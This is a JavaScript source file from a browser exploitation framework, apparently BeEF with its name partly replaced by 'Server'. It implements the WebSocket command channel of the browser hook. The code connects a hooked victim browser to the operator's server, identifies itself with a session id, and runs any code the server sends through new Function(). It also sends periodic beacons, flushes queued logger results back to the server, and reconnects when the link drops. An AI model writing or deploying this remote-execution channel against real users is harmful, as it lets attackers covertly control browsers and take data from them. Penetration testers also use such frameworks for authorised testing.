//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * Manage the WebSocket communication channel.
 * This channel is much faster and responsive, and it's used automatically
 * if the browser supports WebSockets AND server.http.websocket.enable = true.
 * @namespace server.websocket
 */

server.websocket = {

    socket:null,
    ws_poll_timeout: "<%= @ws_poll_timeout %>",
    ws_connect_timeout: "<%= @ws_connect_timeout %>",

    /**
     * Initialize the WebSocket client object.
     * Note: use WebSocketSecure only if the hooked origin is under https.
     * Mixed-content in WS is quite different from a non-WS context.
     */
    init:function () {
        var webSocketServer = server.net.host;
        var webSocketPort = "<%= @websocket_port %>";
        var webSocketSecure = "<%= @websocket_secure %>";
        var protocol = "ws://";

        if(webSocketSecure && window.location.protocol=="https:"){
            protocol = "wss://";
            webSocketPort= "<%= @websocket_sec_port %>";
        }

        if (server.browser.isFF() && !!window.MozWebSocket) {
            server.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
        }else{
            server.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
        }

    },

    /**
     * Send Hello message to the Server server and start async polling.
     */
    start:function () {
        new server.websocket.init();
        this.socket.onopen = function () {
            server.websocket.send('{"cookie":"' + server.session.get_hook_session_id() + '"}');
            server.websocket.alive();
        };

        this.socket.onmessage = function (message) {
            // Data coming from the WebSocket channel is either of String, Blob or ArrayBufferdata type.
            // That's why it needs to be evaluated first. Using Function is a bit better than pure eval().
            // It's not a big deal anyway, because the eval'ed data comes from Server itself, so it is implicitly trusted.
            new Function(message.data)();
        };

        this.socket.onclose = function () {
            setTimeout(function(){server.websocket.start()}, 5000);
        };
    },

    /**
     * Send data back to Server. This is basically the same as server.net.send,
     * but doesn't queue commands.
     * Example usage:
     * server.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
     * '", "result":"' + server.encode.base64.encode(server.encode.json.stringify(results)) +
     * '","callback": "' + callback + '","bh":"' + server.session.get_hook_session_id() + '" }');
     */
    send:function (data) {
        try {
            this.socket.send(data);
        }catch(err){}
    },

    /**
     * Polling mechanism, to notify the Server server that the browser is still hooked,
     * and the WebSocket channel still alive.
     * todo: there is probably a more efficient way to do this. Double-check WebSocket API.
     */
    alive: function (){
        try {
            if (server.logger.running) {
                server.logger.queue();
            }
        } catch(err){}

        server.net.flush();

        server.websocket.send('{"alive":"'+server.session.get_hook_session_id()+'"}');
        setTimeout("server.websocket.alive()", parseInt(server.websocket.ws_poll_timeout));
    }
};

server.regCmp('server.websocket');
